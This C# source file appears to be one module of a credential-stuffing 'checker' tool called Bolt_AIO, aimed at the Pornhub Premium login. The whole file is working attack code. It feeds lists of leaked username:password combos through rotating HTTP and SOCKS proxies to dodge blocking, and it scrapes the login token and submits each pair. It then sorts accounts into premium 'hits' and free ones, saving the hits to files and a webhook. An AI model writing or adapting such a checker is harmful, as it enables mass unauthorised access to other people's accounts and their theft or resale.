using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Pornhubmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var Getlogin = req.Get("https://www.pornhubpremium.com/premium/login").ToString();
                            var access_token = Parse(Getlogin, "token\":\"", "\",\"");
                            var str = "username=" + array[0] + "&password=" + array[1] +
                                      "&redirect=&from=pc_premium_login&segment=straight&token=" + access_token;
                            var strResponse = req.Post("https://www.pornhubpremium.com/front/authenticate", str,
                                "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("message\":\"Invalid username\\/password!") ||
                                    strResponse.Contains("Account disabled. Please try again later"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("premium_redirect_cookie\":\"1\"")) //hit
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Pornhub_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintHit("Pornhub", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Pornhub Hits");
                                }
                                else if (strResponse.Contains("\"premium_redirect_cookie\":\"0\"")) //freeidolater
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Pornhub_frees", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintFree("Pornhub", array[0] + ":" + array[1]);
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}